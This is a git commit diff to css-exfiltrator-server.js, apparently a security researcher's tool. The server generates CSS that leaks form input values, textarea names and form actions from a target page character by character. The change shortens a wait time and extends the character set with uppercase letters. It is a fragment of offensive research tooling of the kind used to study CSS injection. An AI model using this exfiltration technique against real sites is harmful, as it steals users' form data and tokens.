af6a183c812764f2fb728862b4145b8bceee2302
Gareth Heyes <gareth.heyes@portswigger.net>
2023-11-29 13:07:31 +0000

    Generated uppercase characters too

--- css-exfiltrator-server.js
+++ css-exfiltrator-server.js
@@ -7,9 +7,9 @@ const ELEMENTS = ["input","textarea","form"];
 const ATTRIBUTES = {__proto__:null,"input":["name","value"],"textarea":["name"],"form":["action"]};
 const MAX_ELEMENTS = 20;
 const MAX_VALUE = 50;
-const WAIT_TIME_MS = 500;
+const WAIT_TIME_MS = 250;
 
-const CHARS = String.fromCodePoint(32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126).split('');
+const CHARS = "abcdefghijklmnopqrstuvwxyz0123456789 ABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%&'()*+,-./:;<=>?@[\]^_`{|}~".split('');
 
 var stop = false, n = 0, prefixes = {__proto__:null};
 var tokens = [], foundToken = false, currentElementPos = 0;
@@ -97,7 +97,7 @@ const genResponse = (response, elementNumber) => {
                     for(let j=0;j<MAX_VALUE;j++) {         
                         const variablePrefix = '--'+element+'-'+attribute+'-'+i+'-'+j;  
                         properties.push('var('+variablePrefix+'s,none)');              
-                        properties.push('var('+variablePrefix+'full-token,none)');  
+                        properties.push('var('+variablePrefix+'full-token,none)');                    
                     }
                 }
             }
